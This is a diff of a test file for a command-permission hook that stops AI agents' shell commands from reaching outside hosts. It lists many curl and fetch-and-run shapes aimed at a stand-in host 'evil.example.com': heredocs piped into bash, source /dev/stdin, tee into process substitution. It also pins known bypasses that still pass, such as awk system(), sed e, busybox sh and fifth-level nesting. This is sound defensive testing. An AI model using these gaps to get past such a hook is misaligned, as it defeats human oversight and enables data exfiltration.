@@ -647,6 +647,8 @@ describe('every PREFIX_WORDS entry in front of a heredoc-fed interpreter', () =>
     nice: ['nice', 'nice -n 5', 'nice -5'],
     timeout: ['timeout 30', 'timeout 30s', 'timeout -k 5 30', 'timeout --preserve-status 1m'],
     stdbuf: ['stdbuf -oL', 'stdbuf -o L', 'stdbuf -oL -eL'],
+    setsid: ['setsid', 'setsid -w'],
+    watch: ['watch', 'watch -n 60', 'watch --interval 5'],
     do: ['do'],
     then: ['then'],
     else: ['else'],
@@ -731,6 +733,9 @@ describe('a URL fed to a while-read loop', () => {
   })
 })
 
+// Six shapes were pinned open here until EGRESSPARAMEXP1009 (a destination the parser cannot read:
+// a file-fed loop, an array, an unset variable, a value computed by a substitution). They are denied
+// now and tested in bash-egress-paramexp.test.ts.
 describe('still open after (a) -- pinned on purpose', () => {
   const OPEN = [
     'bash ./fetch.sh', // the network call is inside the script file
@@ -741,22 +746,15 @@ describe('still open after (a) -- pinned on purpose', () => {
     // Closing it means reading files at hook time, which is left to a follow-up (see the PR comment).
     `cat > /tmp/s.py <<'PY'\nimport urllib.request\nurllib.request.urlopen('https://example.org/x')\nPY\npython3 /tmp/s.py`,
     `python3 - <<'PY'\nopen('/tmp/s.py','w').write("import urllib.request\\nurllib.request.urlopen('https://example.org/x')\\n")\nPY`,
-    // a program PIPED into an interpreter (the heredoc is on cat, not on python3); the heredoc on the
-    // interpreter itself is closed since EGRESSHEREDOC924, see 'heredoc-fed interpreters' below
-    `cat <<'PY' | python3 -\nimport urllib.request; urllib.request.urlopen('https://example.org')\nPY`,
-    'while read u; do curl -s "$u"; done < urls.txt', // loop values read from a file
+    // (a heredoc on cat piped into an interpreter was pinned here; it is closed since card 55d8cd24, see
+    // 'a data-looking heredoc whose text runs as code' at the end of the file. A program that reaches an
+    // interpreter through a pipe from echo / printf / a file stays open.)
     // the families the header lists as open after EGRESSHEREDOC924 (reviewer probe A8-A11, A14)
     'xargs -n1 curl -s <<< "https://example.org/x"', // an argument builder fed on stdin
-    'mapfile -t a <<< "https://example.org/x"; curl -s "${a[0]}"', // an array filler
-    'IFS=, read a b <<< "x,https://example.org/x"; curl -s "$b"', // read under a non-default IFS
-    'while read u; do curl -s "$u"; done < <(echo https://example.org/x)', // process substitution input
     `python3 - <<'PY'\nimport socket; socket.create_connection(("example.org", 80))\nPY`, // no URL scheme
-    'H=$(cat host.txt); curl -s "http://$H/x"', // host not literally in the command
-    'curl -s "$URL"', // URL from the environment
-    'curl $(echo https://example.org)', // URL computed at runtime by a substitution (#1514 review B)
-    'curl -K curl.cfg', // URL read from a curl config file
-    'git clone https://example.org/r.git', // other network-capable binaries
-    'pip install https://example.org/p.tar.gz',
+    // `git clone`, `git ls-remote`, `wget`, `pip download`, `yt-dlp` and `npx playwright` were pinned open here; since card
+    // 521f1f39 (owner 4554) they are judged PER AGENT and an unnamed caller is denied: see bash-egress-bypass-per-agent.test.ts.
+    'pip install https://example.org/p.tar.gz', // other network-capable binaries
     'ssh user@example.org true',
   ]
   it('does not claim these', () => {
@@ -1002,5 +1000,321 @@ describe('vendor-API domain allowlist ("domains" key, opt-in)', () => {
       expect(run('curl -s https://example.com.evil.net/v1', withKey).stdout).toContain('"permissionDecision":"deny"')
       expect(run('curl -s https://api.example.com/v1', without).stdout).toContain('"permissionDecision":"deny"')
     } finally { rmSync(dir, { recursive: true, force: true }) }
+  })
+})
+
+// EGRESSQUOTED1013 (card 55d8cd24 (c)), narrowed by the owner (Telegram 4457, 2026-10-13): a heredoc is judged
+// when it RUNS as code (an interpreter's or a shell's program), and is text when it is DATA (cat, tee,
+// curl --data-binary @-, a message script, a here-string to cat). The first version of this rule denied a
+// quoted `curl https://...` line in any data heredoc; measured on the fleet's transcripts that caught
+// messages, memory saves and reports that QUOTE a curl line, not calls, so the data half was withdrawn.
+describe('a heredoc is judged when it runs as code, not when it is data (full mode)', () => {
+  const CURL = 'curl -s https://example.org/v1'
+  it('ALLOWS a quoted curl line in a data heredoc: cat, tee, a file write, a message script, curl --data-binary @-, a here-string', () => {
+    for (const cmd of [
+      `cat > /tmp/HANDOFF.md <<'EOF'\nNext: run ${CURL} again\nEOF`,
+      `cat <<EOF\n${CURL}\nEOF`,
+      `tee /tmp/notes.txt <<'EOF'\nrun: ${CURL}\nEOF`,
+      `bash scripts/agent-msg.sh igor hex - <<'EOF'\nA hiba: ${CURL} nem megy\nEOF`,
+      `curl -s -X POST http://localhost:3420/api/messages -H "Content-Type: application/json" --data-binary @- <<'JSON'\n{"content":"${CURL} nem megy"}\nJSON`,
+      `cat <<< "run ${CURL}"`,
+      `cat > /tmp/HANDOFF.md <<'EOF'\nNext: rerun the call\n$(curl http://example.org)\nEOF`,
+    ]) expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: false })
+  })
+  it('DENIES the same curl line when the heredoc is what an interpreter or a shell runs', () => {
+    for (const cmd of [
+      `bash <<'EOF'\n${CURL}\nEOF`,
+      `sh <<EOF\n${CURL}\nEOF`,
+      `zsh - <<'EOF'\n${CURL}\nEOF`,
+      `bash -s <<'EOF'\n${CURL}\nEOF`,
+      `bash <<< '${CURL}'`,
+      `python3 - <<'PY'\nimport urllib.request\nurllib.request.urlopen('https://example.org/v1')\nPY`,
+      `node <<'EOF'\nfetch('https://example.org/v1')\nEOF`,
+    ]) expect({ cmd, r: classify(cmd) }).toEqual({ cmd, r: { deny: true, reason: expect.stringMatching(/^heredoc-/), hosts: ['example.org'] } })
+  })
+  it('NEGATIVE CONTROL: the same text is data for cat and code for bash', () => {
+    const body = `\n${CURL}\nEOF`
+    expect(deny(`cat <<EOF${body}`)).toBe(false)
+    expect(deny(`bash <<EOF${body}`)).toBe(true)
+  })
+  it('the main agent (git-only mode) is not affected either way', () => {
+    expect(classify(`cat <<EOF\n${CURL}\nEOF`, 0, new Set(), new Set(), true).deny).toBe(false)
+    expect(classify(`bash <<'EOF'\n${CURL}\nEOF`, 0, new Set(), new Set(), true).deny).toBe(false)
+  })
+  it('stays open as before: curl without a URL, a URL without curl, localhost, a vendor host', () => {
+    for (const cmd of [
+      `cat <<EOF\nthe tool is called curl\nEOF`,
+      `cat <<EOF\nsee https://example.org/docs for details\nEOF`,
+      `cat <<EOF\ncurl -s http://localhost:3420/api/health\nEOF`,
+      `bash scripts/agent-msg.sh igor hex - < /tmp/msg.txt`,
+    ]) expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: false })
+    const V = parseVendorHosts({ hosts: ['example.org'] })
+    expect(classify(`bash <<EOF\n${CURL}\nEOF`, 0, V).deny).toBe(false)
+  })
+})
+
+// Sam 3528 / HEX 3530: the data / code split does not rest on the command word that READS the heredoc. The text
+// is code when it ends up as a shell's or an interpreter's program: `cat <<EOF | bash`, `source /dev/stdin
+// <<EOF`, `tee <<EOF >(bash)`. 216e65e0 denied all of these (by accident, through the quoted-curl rule); the
+// first version of the narrowing let them through, which was a loosening of an approved state.
+describe('a data-looking heredoc whose text runs as code (Sam 3528, HEX 3530)', () => {
+  const U = 'https://evil.example.com/x'
+  const CURL = `curl -s ${U}`
+  const body = `\n${CURL}\nEOF`
+  it('DENIES it when the text is piped into a shell, naming the host', () => {
+    for (const cmd of [
+      `cat <<'EOF' | bash${body}`,
+      `cat <<'EOF' | sh${body}`,
+      `cat <<'EOF' | bash -s${body}`,
+      `cat <<'EOF' | bash -${body}`,
+      `cat <<'EOF' | zsh${body}`,
+      `cat <<'EOF' | grep -v '^#' | bash${body}`,
+      `cat <<'EOF' | sed 's/a/b/' | sh${body}`,
+      `cat <<'EOF' | xargs -I{} bash -c {}${body}`,
+      // a redirection or a `|&` on the shell does not give it a program of its own
+      `cat <<'EOF' | bash 2>&1${body}`,
+      `cat <<'EOF' | bash >/dev/null${body}`,
+      `cat <<'EOF' |& bash${body}`,
+      `cat <<'EOF' |& xargs -I{} bash -c {}${body}`,
+      `cat <<'EOF' |& grep -v '^#' | bash${body}`,
+      `cat <<'EOF' | tee /dev/stdout | bash${body}`,
+      `cat <<'EOF' | env bash${body}`,
+      `cat <<'EOF' | /bin/bash${body}`,
+    ]) expect({ cmd, r: classify(cmd) }).toEqual({ cmd, r: { deny: true, reason: 'heredoc-curl-external', hosts: ['evil.example.com'] } })
+  })
+  it('DENIES it for source /dev/stdin, . /dev/stdin and tee into a process-substituted shell', () => {
+    for (const cmd of [
+      `source /dev/stdin <<'EOF'${body}`,
+      `. /dev/stdin <<'EOF'${body}`,
+      `source /dev/fd/0 <<'EOF'${body}`,
+      `tee <<'EOF' >(bash)${body}`,
+    ]) expect({ cmd, r: classify(cmd) }).toEqual({ cmd, r: { deny: true, reason: 'heredoc-curl-external', hosts: ['evil.example.com'] } })
+  })
+  it('DENIES an interpreter program that reaches the network, piped in', () => {
+    for (const cmd of [
+      `cat <<'EOF' | python3\nimport urllib.request\nurllib.request.urlopen('${U}')\nEOF`,
+      `cat <<'EOF' | node\nfetch('${U}')\nEOF`,
+    ]) expect({ cmd, r: classify(cmd) }).toEqual({ cmd, r: { deny: true, reason: 'heredoc-external', hosts: ['evil.example.com'] } })
+  })
+  it('NEGATIVE CONTROLS: text filtered, counted, sent as a payload, or handed to a shell that has its own program stays data', () => {
+    for (const cmd of [
+      `cat <<EOF | grep curl${body}`,
+      `cat <<EOF | wc -l${body}`,
+      `curl -s -X POST http://localhost:3420/api/messages --data-binary @- <<'JSON'\n{"content":"${CURL}"}\nJSON`,
+      // the bash at the end of the pipe gets curl's RESPONSE, not the heredoc
+      `cat <<'EOF' | curl -s --data-binary @- http://localhost:3420/x | bash${body}`,
+      // a shell given a script file or -c reads its program from there, not from stdin
+      `cat <<'EOF' | bash run.sh${body}`,
+      `cat <<'EOF' | bash -c 'cat'${body}`,
+      `cat <<'EOF' | bash run.sh 2>&1${body}`,
+      `cat <<'EOF' | grep curl 2>&1${body}`,
+      `cat <<'EOF' | python3 -m json.tool\n{"a":"${CURL}"}\nEOF`,
+      // no pipe: the semicolon ends the heredoc's command
+      `cat <<'EOF'; bash${body}`,
+      `source /tmp/f.sh <<'EOF'${body}`,
+    ]) expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: false })
+  })
+  it('the main agent (git-only mode) judges the force-push family through the same pipe', () => {
+    const isGitOnly = (cmd: string) => /(?:^|-)git-/.test(classify(cmd, 0, new Set(), new Set(), true).reason ?? '')
+    expect(isGitOnly(`cat <<'EOF' | bash\ngit push --force origin main\nEOF`)).toBe(true)
+    expect(isGitOnly(`cat <<'EOF' | grep push\ngit push --force origin main\nEOF`)).toBe(false)
+  })
+})
+
+// Sam 3544 / HEX 3546 (third round): the OPTIONS of the shell or interpreter at the end of the pipe. Whether a
+// stage reads its program from stdin is decided by the options, not by "every word starts with a dash": after
+// `-s` or `-` the rest are positional ARGUMENTS, `-o NAME` / `-O NAME` / `-W x` / `--rcfile f` carry a value of
+// their own, and `-c` counts only as a short option (not the `c` in `--norc`). A plain word is a script file.
+describe('options of the program at the end of the pipe (Sam 3544, HEX 3546)', () => {
+  const U = 'https://evil.example.com/x'
+  const SH = `\n${`curl -s ${U}`}\nEOF`
+  const PY = `\nimport urllib.request\nurllib.request.urlopen('${U}')\nEOF`
+  const JS = `\nfetch('${U}')\nEOF`
+  it('DENIES a shell that takes the text as its program, with any of its options', () => {
+    for (const tail of [
+      'bash -s arg1', 'bash -s -- arg1', 'sh -s stable', 'bash - arg1', 'bash -o pipefail', 'bash -O extglob',
+      'bash --norc', 'bash --rcfile /tmp/rc', 'bash -eo pipefail', 'bash -x -s', 'bash --login', 'bash -e', 'bash +o history',
+      'zsh -s', 'dash -s -- a b', 'bash --init-file /tmp/rc', 'bash --init-file=/tmp/rc',
+    ]) {
+      const cmd = `cat <<'EOF' | ${tail}${SH}`
+      expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: true })
+    }
+  })
+  it('DENIES an interpreter that takes the text as its program, with any of its options', () => {
+    for (const [tail, body] of [
+      ['python3 -W ignore', PY], ['python3 -X dev', PY], ['python3 -Wignore', PY], ['python3 -u -', PY], ['python3 -u -B', PY],
+      ['node --stack-size=2000', JS], ['node -r dotenv/config', JS], ['node --no-warnings', JS],
+      ['node --input-type module', JS], ['node --input-type=module', JS], ['node --input-type module -', JS],
+    ] as const) {
+      const cmd = `cat <<'EOF' | ${tail}${body}`
+      expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: true })
+    }
+  })
+  it('NEGATIVE CONTROLS: a script file, -c, -m or -e is a program of its own, so the text is data', () => {
+    for (const tail of [
+      'bash run.sh', 'bash -x run.sh', 'bash -- run.sh', "bash -c 'cat'", "bash -sc 'cat'", 'bash -o pipefail run.sh', 'bash --norc run.sh',
+      'python3 script.py', 'python3 -W ignore script.py', 'python3 -m json.tool', "python3 -c 'import sys; print(len(sys.stdin.read()))'",
+      'node app.js', "node -e 'process.stdin.pipe(process.stdout)'", 'bash scripts/agent-msg.sh sam hex -',
+    ]) {
+      const cmd = `cat <<'EOF' | ${tail}${SH}`
+      expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: false })
+    }
+  })
+})
+
+// Sam 3555 (M1) / HEX 3558: a subshell or a group whose closing `) | bash` / `} | bash` sits on a LATER line than
+// the heredoc operator, after the terminator. The one-line forms were denied already; the multi-line ones passed
+// because only the heredoc's own line was read. The heredoc bodies are cut out and the whole command is split.
+describe('a multi-line subshell or group around a data-looking heredoc (Sam 3555, HEX 3558)', () => {
+  const U = 'curl -s https://evil.example.com/x'
+  const hd = (open: string, close: string, extra = '') => `${open}cat <<'EOF'\n${U}\nEOF\n${extra}${close}`
+  it('DENIES the closing line that pipes the group or subshell into a shell', () => {
+    for (const cmd of [
+      hd('(', ') | bash'), hd('{ ', '} | bash'), hd('{ echo x; ', '} | bash'), hd('(\n', ') | sh'), hd('{\n', '} | sh'),
+      hd('(', ') | bash', 'echo done\n'), hd('{ ', '} | bash', 'echo done\n'), hd('(', ')|bash'), hd('( ', ') | bash -s'),
+      hd('(', ') | tac | bash'), hd('(', ') | xargs -I{} bash -c {}'),
+      `{ echo x; source /dev/stdin <<'EOF'\n${U}\nEOF\n}`,
+      `(tee <<'EOF' >(bash)\n${U}\nEOF\n)`,
+      `echo before\n(cat <<'EOF'\n${U}\nEOF\n) | bash\necho after`,
+      `(cat <<'EOF' |\n${U}\nEOF\nbash)`,
+      // a heredoc BEFORE the one that is piped moves its offset in the cut text
+      `cat <<'A' > /tmp/f\nplain text\nA\ncat <<'B' | bash\n${U}\nB\necho tail`,
+      // `}` that ends a word is not the group's closing brace
+      `{ echo a}; cat <<'EOF'\n${U}\nEOF\n} | bash`,
+    ]) expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: true })
+  })
+  it('the one-line forms are still denied, and the quote in a body does not hide the closing line', () => {
+    for (const cmd of [
+      `(cat <<'EOF') | bash\n${U}\nEOF`, `{ cat <<'EOF'; } | bash\n${U}\nEOF`,
+      `(cat <<'EOF'\necho "it's"\n${U}\nEOF\n) | bash`,
+    ]) expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: true })
+  })
+  it('NEGATIVE CONTROLS: the group is not piped into a shell, or its text is counted or written', () => {
+    for (const cmd of [
+      hd('(', ') > out.txt'), hd('{ ', '} > out.txt'), hd('(', ') | wc -l'), hd('{ ', '} | sha256sum'),
+      hd('{ ', '}', 'bash run.sh\n'), hd('(', ')', 'echo x | bash\n'), hd('(', ') | bash run.sh'),
+      `(cat <<'EOF'\n${U}\nEOF\n)\nbash script.sh`,
+      // the stage that counts the text ends the chain for the enclosing pipe too
+      `(cat <<'EOF' | wc -l\n${U}\nEOF\n) | bash`,
+    ]) expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: false })
+  })
+  it('a brace that is not a group does not swallow the separators after it', () => {
+    for (const cmd of [
+      `echo \${x} {a,b}; cat <<'EOF' | bash\n${U}\nEOF`,
+      `echo { ; cat <<'EOF' | bash\n${U}\nEOF`,
+      `find . -exec echo {} \\; ; cat <<'EOF' | bash\n${U}\nEOF`,
+    ]) expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: true })
+  })
+})
+
+// Sam 3555 (M2, minor 3-4) / HEX 3558: named limits, pinned so that closing one flips the test. perl, ruby, php
+// and deno follow the old rule (a plain word is a script file), so a value-taking option makes the parser read
+// its value as a script; busybox is no shell word; and the pass-through default has a price.
+describe('named limits of the pipe rule (Sam 3555, HEX 3558)', () => {
+  const SH = `\ncurl -s https://evil.example.com/x\nEOF`
+  const JS = `\nfetch('https://evil.example.com/x')\nEOF`
+  // The body is that interpreter's OWN network code, so a pass is the option rule's doing and not a body that
+  // is harmless to begin with; the bare form of each is the positive control.
+  const U = 'https://evil.example.com/x'
+  const PERL = `\nuse LWP::Simple; get("${U}");\nEOF`
+  const RUBY = `\nrequire 'net/http'; Net::HTTP.get(URI("${U}"))\nEOF`
+  const PHP = `\n<?php file_get_contents('${U}');\nEOF`
+  it('NAMED LIMIT: perl / ruby / php / deno with a value-taking option read as having a script of their own', () => {
+    for (const [tail, body] of [
+      ['perl -M strict', PERL], ['perl -I lib', PERL], ['ruby -I lib', RUBY], ['ruby -r net/http', RUBY], ['php -d display_errors=1', PHP], ['deno run -A -', JS],
+    ] as const) {
+      const cmd = `cat <<'EOF' | ${tail}${body}`
+      expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: false })
+    }
+  })
+  it('POSITIVE CONTROL for the limit above: the bare forms are judged, with the same bodies', () => {
+    for (const [tail, body] of [['perl', PERL], ['perl -', PERL], ['ruby', RUBY], ['ruby -', RUBY], ['php', PHP]] as const) {
+      const cmd = `cat <<'EOF' | ${tail}${body}`
+      expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: true })
+    }
+  })
+  it('NAMED LIMIT: busybox sh is not a shell word', () => {
+    for (const tail of ['busybox sh', 'busybox sh -s']) {
+      const cmd = `cat <<'EOF' | ${tail}${SH}`
+      expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: false })
+    }
+  })
+  it('PRICE of the pass-through default: a program in the middle whose own OUTPUT is the shell input is denied too', () => {
+    for (const mid of ['python3 gen.py', 'jq -r -R .', 'sqlite3 db']) {
+      const cmd = `cat <<'EOF' | ${mid} | bash${SH}`
+      expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: true })
+    }
+  })
+})
+
+// Sam 3544 (2, 3) / HEX 3546: the pipe is followed through EVERY stage that hands its stdin on, not through a
+// closed list of filters, and through the structural forms (a group, a subshell, a process substitution with a
+// prefix command). A stage that counts, hashes, compares or ships the text ends the chain.
+describe('the pipe from a data-looking heredoc to a shell (Sam 3544, HEX 3546)', () => {
+  const body = `\ncurl -s https://evil.example.com/x\nEOF`
+  it('DENIES it through any pass-through stage', () => {
+    for (const mid of ['tac | tac', 'expand', 'dd status=none', 'iconv -f utf-8 -t utf-8', "perl -pe 's/a/b/'", "sed 's/a/b/'", 'tr a-z A-Z', 'grep -v "^#"',
+      "python3 -c 'import sys; sys.stdout.write(sys.stdin.read())'", 'tee /tmp/copy.sh']) {
+      const cmd = `cat <<'EOF' | ${mid} | bash${body}`
+      expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: true })
+    }
+  })
+  it('DENIES the structural forms: a subshell, a group, a process substitution with a prefix command', () => {
+    for (const cmd of [
+      `(cat <<'EOF') | bash${body}`,
+      `{ cat <<'EOF'; } | bash${body}`,
+      `tee <<'EOF' >(exec bash)${body}`,
+      `tee <<'EOF' >(timeout 5 bash)${body}`,
+      `tee <<'EOF' >( bash -s )${body}`,
+      `source /proc/self/fd/0 <<'EOF'${body}`,
+      `(source /dev/stdin <<'EOF')${body}`,
+      `(. /dev/stdin <<'EOF')${body}`,
+    ]) expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: true })
+  })
+  it('DENIES xargs when the command it runs is a shell with -c, and not when a shell is only a word on the line', () => {
+    for (const cmd of [`cat <<'EOF' | xargs -I{} bash -c {}${body}`, `cat <<'EOF' | xargs -n1 sh -c${body}`]) {
+      expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: true })
+    }
+    for (const cmd of [
+      `cat <<'EOF' | xargs -I{} echo checking bash for {}${body}`,
+      `cat <<'EOF' | xargs -I{} cp {} /tmp/sh${body}`,
+      `cat <<'EOF' | xargs -I{} bash run.sh {}${body}`,
+    ]) expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: false })
+  })
+  it('NEGATIVE CONTROLS: a stage that counts, hashes, compares or ships the text ends the chain', () => {
+    for (const mid of ['wc -l', 'sha256sum', 'md5sum', 'cksum', 'grep -c curl', 'grep -q curl', 'curl -s --data-binary @- http://localhost:3420/x', 'diff - /tmp/f']) {
+      const cmd = `cat <<'EOF' | ${mid} | bash${body}`
+      expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: false })
+    }
+  })
+  it('NAMED LIMIT (pinned, flip it when closed): code run INSIDE a filter has no shell at the end to judge', () => {
+    for (const tail of [`awk '{system($0)}'`, 'sed e', 'while read l; do eval "$l"; done']) {
+      const cmd = `cat <<'EOF' | ${tail}${body}`
+      expect({ cmd, deny: deny(cmd) }).toEqual({ cmd, deny: false })
+    }
+  })
+})
+
+// Sam 3528, KISEBB 2: the nesting depth of a shell heredoc. A mutant that cut the limit to 1 passed the whole
+// suite because no test nested a heredoc inside a heredoc. Levels 1-4 are judged; level 5 and deeper is a
+// NAMED LIMIT (measured the same on the base d6f5a723): the recursion stops at depth 4 and lets the text pass.
+describe('nested shell heredocs', () => {
+  const CURL = 'curl -s https://evil.example.com/x'
+  const nested = (n: number) => {
+    let body = CURL
+    for (let i = n; i >= 1; i--) body = `bash <<'T${i}'\n${body}\nT${i}`
+    return body
+  }
+  it('judges the curl line at nesting levels 1, 2, 3 and 4', () => {
+    for (const n of [1, 2, 3, 4]) {
+      const cmd = nested(n)
+      expect({ n, r: classify(cmd) }).toEqual({ n, r: { deny: true, reason: `${'heredoc-'.repeat(n)}curl-external`, hosts: ['evil.example.com'] } })
+    }
+  })
+  it('a heredoc inside a bash -c body is judged too', () => {
+    expect(deny(`bash -c "bash <<'EOF'\n${CURL}\nEOF"`)).toBe(true)
+  })
+  it('NAMED LIMIT (pinned, flip it when the depth is closed): five levels deep passes', () => {
+    expect(deny(nested(5))).toBe(false)
   })
 })
